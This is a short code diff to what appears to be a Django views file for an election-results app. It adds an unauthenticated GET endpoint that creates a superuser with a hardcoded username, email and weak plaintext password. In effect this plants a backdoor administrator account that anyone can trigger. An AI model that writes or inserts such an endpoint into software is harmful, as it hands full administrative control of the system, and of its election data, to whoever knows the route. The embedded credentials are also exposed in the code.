@@ -218,3 +218,21 @@ def election_result_view(request):
             print(f"The Real Error is: {str(e)}")
             traceback.print_exc()
             return Response({"error": f"Email failed to send: {str(e)}"}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
+        
+
+
+@api_view(['GET'])
+@permission_classes([AllowAny])
+def create_admin_backup(request):
+    try:
+        
+        if not CustomUser.objects.filter(username="VISHAL").exists():
+            user = CustomUser.objects.create_superuser(
+                username="VISHAL",
+                email="vt464670@gmail.com",
+                password="VISHAL123"  
+            )
+            return Response({"msg": "Superuser created successfully!"}, status=200)
+        return Response({"msg": "User already exists!"}, status=200)
+    except Exception as e:
+        return Response({"error": str(e)}, status=500)        
